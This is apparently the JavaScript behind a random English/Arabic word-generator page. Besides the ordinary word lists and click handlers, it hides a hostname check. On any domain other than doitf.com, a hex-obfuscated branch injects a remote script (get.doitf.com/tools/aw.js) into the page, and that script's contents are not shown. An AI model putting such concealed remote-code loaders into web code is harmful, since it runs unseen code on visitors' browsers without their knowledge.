function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);
var rwordsen=["accept","add","admire","admit","advise","afford","agree","alert","allow","amuse","analyze","announce","annoy","answer","apologise","appear","applaud","appreciate","approve","argue","arrange","arrest","arrive","ask","attach","attack","attempt","attend","attract","avoid","back","bake","balance","ban","bang","bare","bat","bathe","battle","beam","beg","behave","belong","bleach","bless","blind","blink","blot","blush","boast","boil","bolt","bomb","book","bore","borrow","bounce","bow","box","brake","branch","breathe","bruise","brush","bubble","bump","burn","bury","buzz","calculate","call","camp","care","carry","carve","cause","challenge","change","charge","chase","cheat","check","cheer","chew","choke","chop","claim","clap","clean","clear","clip","close","coach","coil","collect","colour","comb","command","communicate","compare","compete","complain","complete","concentrate","concern","confess","confuse","connect","consider","consist","contain","continue","copy","correct","cough","count","cover","crack","crash","crawl","cross","crush","cry","cure","curl","curve","cycle","dam","damage","dance","dare","decay","deceive","decide","decorate","delay","delight","deliver","depend","describe","desert","deserve","destroy","detect","develop","disagree","disappear","disapprove","disarm","discover","dislike","divide","double","doubt","drag","drain","dream","dress","drip","drop","drown","drum","dry","dust","earn","educate","embarrass","employ","empty","encourage","end","enjoy","enter","entertain","escape","examine","excite","excuse","exercise","exist","expand","expect","explain","explode","extend","face","fade","fail","fancy","fasten","fax","fear","fence","fetch","file","fill","film","fire","fit","fix","flap","flash","float","flood","flow","flower","fold","follow","fool","force","form","found","frame","frighten","fry","gather","gaze","glow","glue","grab","grate","grease","greet","grin","grip","groan","guarantee","guard","guess","guide","hammer","hand","handle","hang","happen","harass","harm","hate","haunt","head","heal","heap","heat","help","hook","hop","hope","hover","hug","hum","hunt","hurry","identify","ignore","imagine","impress","improve","include","increase","influence","inform","inject","injure","instruct","intend","interest","interfere","interrupt","introduce","invent","invite","irritate","itch","jail","jam","jog","join","joke","judge","juggle","jump","kick","kill","kiss","kneel","knit","knock","knot","label","land","last","laugh","launch","learn","level","license","lick","lie","lighten","like","list","listen","live","load","lock","long","look","love","man","manage","march","mark","marry","match","mate","matter","measure","meddle","melt","memorise","mend","mess","up","milk","mine","miss","mix","moan","moor","mourn","move","muddle","mug","multiply","murder","nail","name","need","nod","note","notice","number","obey","object","observe","obtain","occur","offend","offer","open","order","overflow","owe","own","pack","paddle","paint","park","part","pass","paste","pat","pause","peck","pedal","peel","peep","perform","permit","phone","pick","pinch","pine","place","plan","plant","play","please","plug","point","poke","polish","pop","possess","post","pour","practice","pray","preach","precede","prefer","prepare","present","preserve","press","pretend","prevent","prick","print","produce","program","promise","protect","provide","pull","pump","punch","puncture","punish","push","question","queue","race","radiate","rain","raise","reach","realise","receive","recognise","record","reduce","reflect","refuse","regret","reign","reject","rejoice","relax","release","rely","remain","remember","remind","remove","repair","repeat","replace","reply","report","reproduce","request","rescue","retire","return","rhyme","rinse","risk","rob","rock","roll","rot","rub","ruin","rule","rush","sack","sail","satisfy","save","saw","scare","scatter","scold","scorch","scrape","scratch","scream","screw","scribble","scrub","seal","search","separate","serve","settle","shade","share","shave","shelter","shiver","shock","shop","shrug","sigh","sign","signal","sin","sip","ski","skip","slap","slip","slow","smash","smell","smile","smoke","snatch","sneeze","sniff","snore","snow","soak","soothe","sound","spare","spark","sparkle","spell","spill","spoil","spot","spray","sprout","squash","squeak","squeal","squeeze","stain","stamp","stare","start","stay","steer","step","stir","stitch","stop","store","strap","strengthen","stretch","strip","stroke","stuff","subtract","succeed","suck","suffer","suggest","suit","supply","support","suppose","surprise","surround","suspect","suspend","switch","talk","tame","tap","taste","tease","telephone","tempt","terrify","test","thank","thaw","tick","tickle","tie","time","tip","tire","touch","tour","tow","trace","trade","train","transport","trap","travel","treat","tremble","trick","trip","trot","trouble","trust","try","tug","tumble","turn","twist","type","undress","unfasten","unite","unlock","unpack","untidy","use","vanish","visit","wail","wait","walk","wander","want","warm","warn","wash","waste","watch","water","wave","weigh","welcome","whine","whip","whirl","whisper","whistle","wink","wipe","wish","wobble","wonder","work","worry","wrap","wreck","wrestle","wriggle","x-ray","yawn","yell","zoom"];
var rwordsar=["أبلغ","أثر","أدخل","أرض","أرعب","أضف","أغلق","أفرغ","أقترح","أمر","أمل","أمور","أنين","أنين","أهلا بك","إتبع","إجابة","إختطاف","إدفع","إرجاع","إزالة","إشارة","إصلاح","إضافي","إطار العجلة","إطلاق","إطلاق سراح","إعادة إنتاج","إعداد","إفترض جدلا","إلتواء","إنذار","إنصهار","إنقاذ","إيماءة","ابتسامة","ابتسامة","اثارة","احسب","احمر خدود","احمل","اختبار","اخترع","ارشد","ارقص","استحق","استحم","استعمال","استمتع","استمر","استمع","اسم","اعترف","اعتزم","اعجاب","افتح","افترض","اقتراض","اقفز","اكتب","اكتشف","اكتمال","اكرهه","الأشعة السينية","الإساءة","الإشارة","الإطار","الاتصال","الاخير","الاسترخاء","الاعتماد","الاهتمام","البشري","البقاء","البوب","التألق","التجارة","التحدي","التحديق","التحقق من","الترباس","التشجيع","التغطية","الحرارة","الحزم","الحصول على","الحفاظ على","الخاص بي","الخدعة","الخلط","الدعم","الرد","السفر","السماح","الشحنة","الظل","العد","الغاء القفل","الغش","الفاكس","الفرامل","القاطرة","القراد","الكراك","الكشف","اللون","المخلفات","المذاق","المنع","المواصلات","النهاية","الهرولة","الوعظ","انتظر","انضم","انفجار","ايصال","بارك","بحاجة إلى","بحث","بداية","بدلة","برعم","برغي","برنامج","بريد","بطيء","بقشعريرة","بقعة","بليند","بهجة","تأثير","تأخير","تأوه","تباهى","تبييض","تتضاعف","تتكون","تتلاشى","تثاؤب","تثير","تجادل","تجاهل","تجميع","تجنب","تجول","تجويف","تحدث","تحديد","تحديق","تحسن","تحطيم","تحليل","تحمل","تحية","تحيط","تختفي","تخدم","تخطى","تخيل","تدحرج","تدخل","تدخل","تدرك","تدفق","تذكر","تذكير","تذمر","تربيتة","ترفيه","تركيز","تريد","تزعج","تزلج","تزوج","تزود","تزين","تسرب","تسلم","تسوس","تسوية","تصارع","تصرخ","تصرف","تصرف","تصريح","تصل","تضمن","تطارد","تطفو","تعارض","تعبث","تعبر","تعتمد","تعثر","تعرف","تعزيز - يقوي","تعفن","تعكس","تعلم","تعليق","تعليق","تعليم","تفتيح","تفضل","تقديم","تقطر","تكبير","تلاشى","تلميح","تلميع","تمايل","تمتد","تمديد","تمطر","تملك","تنافس","تنتمي","تنظيف","تنقر","تنهد","تنويه","تهجئه","تهدئة","توازن","توجيه","توحد","توظيف","توقع","توهج","ثقب","ثقة","ثلج","جاف","جذب","جذب","جرح","جزء","جسارة","جلب","جمع","جولة","حارس","حاضر","حب","حديث","حذر","حرق","حرقة","حزام","حزن","حضر","حطام سفينة","حفظ","حفظ","حقن","حكة","حلاقة","حلم","حليب","حمل","حي","خاصة","خبز","ختم","خدش","خراب","خربشة","خطة","خطر","خطف","خطوة","خطيئة","خفض","خلع ملابسه","خمن","خنق","خوف","دافئ","دخان","دغدغة","دفن","دمل","دواسة","دوامة","دورة","ذوبان","رئيس","رائحة","راحه","راقب","ربط","ربطة عنق","رتب","رجاء","رجل","رحلة قصيرة","رخصة","رذاذ","رزمة","رسم","رشفة","رصد","رضا","رعاية","رغبة","رفرف","رفض","رفض","رفع","رقم","ركلة","رمش","ريشة","زحف","زقزقة","زلة","زمن","زميل","زهرة","زيادة","سؤال","سباق","سبب","سبق","سجل","سجن","سحب","سحب","سحب. شد","سحق","سد","سرعه","سرقة","سعال","سكتة دماغية","سلى","سور","سوط","سير","شارك","شاكوش","شحم","شخير","شرارة","شرب حتى الثمالة","شطف","شفاء - يشفى","شك","شكرا","شكل","شم","شيء","صحافة","صحراء","صخرة","صدم","صدمة","صر","صرير","صفارة الحكم","صفعة","صفق","صلى","صمغ","صنارة صيد","صنبور","صندوق","صنوبر","صوت","صيح","ضرر","ضرر","ضع الكلمة المناسبة","ضمان","طابور","طباعة","طبل","طرح او خصم","طرق","طلب","طلب","طور","طويل","عارية","عجل","عجل البحر","عذر","عرض","عقدة","علاج","علامة","عمل","عناق","عودة","عويل","غبار","غرزة","غسل","غمزة","غير مرتب","فائدة","فائض","فارغة","فتره حكم","فحص","فخ","فرشاة","فرض","فرع شجرة","فرك","فزع","فستان","فشل","فقاعة","فك","فلاش","فوضى","فوق","فيضان","فيلم","قائمة","قابس كهرباء","قارن","قاضي","قاعدة","قافية","قال بصوت عال","قبضة","قبلة","قبول","قتل","قتل","قدح","قرر","قرصة","قرع","قشر","قطار","قطاع","قطرة","قطف او يقطف","قف","قفز","قفل","قلق","قنبلة","قياس","كبح","كتاب","كدمة","كرر","كسب","كشط","كف","كومة","كيس","لا أوافق","لائق بدنيا","لطخة","لعب","لعق","لف","لفة","لفه","لكمة","لم يعجبنى","لمس. اتصال. صلة","مأوى","ماء","مارس","مباراة","مبعثر","متجر","متجر","متماسكة","مثل","مجداف","مجنون","محاولة","محاولة","مدرب","مدينون","مربى","مرعب","مزج","مزدوج","مساعدة","مستوى","مسح","مسمار","مشتبه فيه","مشط","مشكلة","مص","مضايقة","مضخة","مضرب","مضغ","مطاردة","مطاردة","معجب","معجون","معركة","معسكر","مفاجأة","مفتاح كهربائي","مقبض","مقطع","مكالمة","مكان","ملء","ملحوظة","ملف","ممارسة","ممارسه الرياضه","منتزه","منحنى","منشار","منعطف أو دور","منفصل","موجة","مور","موضوع","مولع ب","نار","نبات","نبتهج","نحت","نزع السلاح","نسخ","نشيد","نصيحة","نظرة","نظيف","نفذ","نفس","نقطة","نقع","نقل","نقل","نقل","نكتة","نكز","هاتف","هاتف","هجوم","هدم","هرب","هز كتفيه","همسة","همهمة","واضح","وبخ","وثب، ارتداد","وجدت","وجه","وخز","وزن","وسعت","وصف","وصمة","وعد","وقفة","يبقى","يبكي","يتبرع","يتساءل","يتظاهر","يتغيرون","يتقاعد","يتلوى","يجري بيطء","يحتوي","يحدث","يحرج","يحل محل","يحمي","يحول دون","يحوم","يخدع","يدعو","يدير","يربط","يرتعش","يرشد","يركع","يزعج","يزور","يشجع","يشرح","يشع","يصب","يصطدم","يصل","يصلح","يصلح","يضحك","يطالب","يطلب","يطوى","يطيع","يظهر","يعاقب","يعالج","يعاني","يعتبر","يعتذر","يعترف","يعصر","يعطس","يعلن","يغرق","يغيب","يغيظ","يفسد","يقبض على","يقدر","يقذف","يقسم","يقطع","يقطع","يقلى","يكبي بسوتا عالي","ينتج","ينجح","ينحني","يندم","ينفجر","يوافق","يوافق على","يوجد"];


function shuffleWords(o) {
	for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
	return o;
};

var arrStr="";

var numWords = 10;
var lang = "ar";
var separatorWords = ",";
	document.getElementById("reset").addEventListener("click", function () {
document.getElementById("wordPen").innerHTML = "";
document.getElementById("oldText").value = "";
});
	
function wordGen(){
	if (b64awsec == "ZG9pdGYuY29t"){
	separatorWords = document.getElementById("separator").value;
	lang = document.getElementById("language").value;
	numWords = document.getElementById("numWords").value;
	if(lang == "ar"){
    rwords = shuffleWords(rwordsar);
	}else{
	rwords = shuffleWords(rwordsen);
	};

	var a = 0;
    
	while(a < numWords){
		arrStr = arrStr + ' <span class="badge bg-success text-white m-1" id="wordspan'+a+'">' + rwords[a] + '</span>';
		a++;
	}
	}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
};
	


document.addEventListener('DOMContentLoaded', function () {
	document.getElementById("random-words").addEventListener("click", function () {
		
		wordGen();
		
		document.getElementById('wordList').innerHTML = arrStr;

			var x= 0;
				while(x < numWords){
				document.getElementById('wordspan'+x).addEventListener("click", function () {
               var settext = this.removeAttribute("id");
                var settext = this;
				document.getElementById("wordPen").appendChild(settext);
				var sethtml = $("#wordPen").html();
                var remhtml = sethtml.replace(/<span class="badge bg-success text-white m-1">/g,'');
                if(separatorWords == 'enter'){
                var remhtml1 = remhtml.replace(/<\/span>/g,'\n');
                }else{
                var remhtml1 = remhtml.replace(/<\/span>/g,separatorWords);
                }
				document.getElementById("oldText").value = remhtml1;
					
				});
				x++;
			}
		
		arrStr="";	
		
	});
	
	wordGen();
	
	document.getElementById('wordList').innerHTML = arrStr;
		
			var x= 0;
				while(x < numWords){
				document.getElementById('wordspan'+x).addEventListener("click", function () {
                var settext = this.removeAttribute("id");
                var settext = this;
				document.getElementById("wordPen").appendChild(settext);
                
				var sethtml = $("#wordPen").html();
                var remhtml = sethtml.replace(/<span class="badge bg-success text-white m-1">/g,'');
                if(separatorWords == 'enter'){
                var remhtml1 = remhtml.replace(/<\/span>/g,'\n');
                }else{
                var remhtml1 = remhtml.replace(/<\/span>/g,separatorWords);
                }
				document.getElementById("oldText").value = remhtml1;
				});
				x++;
			}
			
	
	arrStr="";
});